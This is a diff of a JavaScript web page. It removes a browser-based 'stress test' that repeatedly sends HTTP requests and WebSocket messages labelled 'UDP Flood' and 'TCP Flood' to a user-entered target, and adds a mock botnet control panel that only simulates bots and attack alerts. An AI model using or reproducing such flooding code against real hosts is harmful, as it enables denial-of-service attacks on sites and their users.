@@ -1,73 +1,39 @@
-document.getElementById('stressForm').addEventListener('submit', function(event) {
-    event.preventDefault();
+// Simulated botnet data
+let bots = [];
+let botCount = 0;
+let botStatus = "Offline";
 
-    const target = document.getElementById('target').value;
-    const targetPort = document.getElementById('targetPort').value || 80;
-    const duration = document.getElementById('duration').value;
-    const attackType = document.getElementById('attackType').value;
-
-    const output = document.getElementById('output');
-    output.innerHTML = 'Starting stress test...';
-
-    stressTest(target, targetPort, duration, attackType, output);
-});
-
-function stressTest(target, targetPort, duration, attackType, output) {
-    const startTime = Date.now();
-    const endTime = startTime + (duration * 1000);
-
-    function pingTarget() {
-        const img = new Image();
-        img.src = `http://${target}`;
-        img.onload = function() {
-            output.innerHTML += 'Ping successful.<br>';
-        };
-        img.onerror = function() {
-            output.innerHTML += 'Ping failed.<br>';
-        };
-    }
-
-    function sendHTTPRequest() {
-        const xhr = new XMLHttpRequest();
-        xhr.open('GET', `http://${target}`, true);
-        xhr.send();
-    }
-
-    function sendUDPRequest() {
-        const socket = new WebSocket(`ws://${target}:${targetPort}`);
-        socket.onopen = function() {
-            socket.send('UDP Flood');
-        };
-        socket.onclose = function() {
-            socket.close();
-        };
-    }
-
-    function sendTCPRequest() {
-        const socket = new WebSocket(`ws://${target}:${targetPort}`);
-        socket.onopen = function() {
-            socket.send('TCP Flood');
-        };
-        socket.onclose = function() {
-            socket.close();
-        };
-    }
-
-    function stressLoop() {
-        if (Date.now() < endTime) {
-            if (attackType === 'http') {
-                sendHTTPRequest();
-            } else if (attackType === 'udp') {
-                sendUDPRequest();
-            } else if (attackType === 'tcp') {
-                sendTCPRequest();
-            }
-            setTimeout(stressLoop, 100); // Adjust the interval as needed
-        } else {
-            output.innerHTML += 'Stress test completed.';
-        }
-    }
-
-    pingTarget();
-    stressLoop();
+// Function to simulate botnet status
+function updateBotnetStatus() {
+    document.getElementById('bot-count').innerText = botCount;
+    document.getElementById('bot-status').innerText = botStatus;
 }
+
+// Function to simulate starting an attack
+function startAttack() {
+    const targetUrl = document.getElementById('target-url').value;
+    const attackType = document.getElementById('attack-type').value;
+
+    if (!targetUrl) {
+        alert('Please enter a target URL.');
+        return;
+    }
+
+    // Simulate attack
+    console.log(`Starting ${attackType} attack on ${targetUrl} with ${botCount} bots.`);
+    alert(`Starting ${attackType} attack on ${targetUrl} with ${botCount} bots.`);
+}
+
+// Simulate botnet initialization
+function initializeBotnet() {
+    // Simulate adding bots to the botnet
+    for (let i = 0; i < 10; i++) {
+        bots.push(`Bot ${i + 1}`);
+    }
+    botCount = bots.length;
+    botStatus = "Online";
+    updateBotnetStatus();
+}
+
+// Initialize the botnet when the page loads
+window.onload = initializeBotnet;
